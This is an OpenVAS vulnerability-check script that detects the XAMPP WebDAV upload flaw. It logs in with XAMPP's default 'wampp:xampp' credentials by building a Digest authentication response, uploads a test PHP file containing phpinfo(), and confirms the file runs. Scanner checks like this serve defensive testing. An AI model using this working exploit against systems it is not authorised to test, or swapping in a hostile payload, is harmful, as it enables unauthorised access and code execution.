###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xampp_webdav_php_upload_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# XAMPP WebDAV PHP Upload Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to gain unauthorized
  access to the system.
  Impact Level: System/Application";
tag_affected = "XAMPP";
tag_insight = "The flaw exists because XAMPP contains a default username and password within
  the WebDAV folder, which allows attackers to gain unauthorized access to the
  system.";
tag_solution = "No solution or patch is available as of 17th January, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.apachefriends.org/en/xampp.html";
tag_summary = "This host is running XAMPP and prone to PHP upload vulnerability.";

if(description)
{
  script_id(802293);
  script_version("$Revision: 12 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-01-17 12:12:12 +0530 (Tue, 17 Jan 2012)");
  script_name("XAMPP WebDAV PHP Upload Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/72397");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18367");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108420/xampp_webdav_upload_php.rb.txt");

  script_description(desc);
  script_summary("Check if XAMPP is vulnerable to PHP upload");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_xampp_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)) {
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Confirm the application
if (! xamppVer = get_kb_item("www/" + port + "/XAMPP")){
  exit(0);
}

## Send Request Without Authorization
url = "/webdav/openvastest" + rand() + ".php";
req = http_put(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req);

## Get Nonce
nonce = eregmatch(pattern:'nonce="([^"]*)', string:res);
if(isnull(nonce[1])) {
  exit(0);
}
nonce = nonce[1];

cnonce = rand();  ## Client Nonce
qop = "auth";     ## Quality of protection code
nc = "00000001";  ## nonce-count

## Build Response
ha1 = hexstr(MD5("wampp:XAMPP with WebDAV:xampp"));
ha2 = hexstr(MD5("PUT:" + url));
response = hexstr(MD5(string(ha1,":",nonce,":",nc,":",cnonce,":",qop,":",ha2)));

## Construct Request with Default Authorization
data = "<?php phpinfo();?>";
req = string("PUT ", url, " HTTP/1.1\r\n",
             "Host: ", get_host_name(), "\r\n",
             "User-Agent: OpenVAS\r\n",
             'Authorization: Digest username="wampp", realm="XAMPP with WebDAV",',
             'nonce="',nonce,'",', 'uri="',url,'", algorithm=MD5,',
             'response="', response,'", qop=', qop,', nc=',nc,', cnonce="',cnonce,'"',"\r\n",
             "Content-Length: ", strlen(data), "\r\n\r\n", data);

## Try to upload php file
res = http_keepalive_send_recv(port:port, data:req);

## Confirm the vulnerability
if(res =~ "HTTP/1.. 201")
{
  ## Confirm exploit worked by checking the response
  if(http_vuln_check(port:port, url:url, pattern:">phpinfo\(\)<")){
    security_hole(port);
  }
}
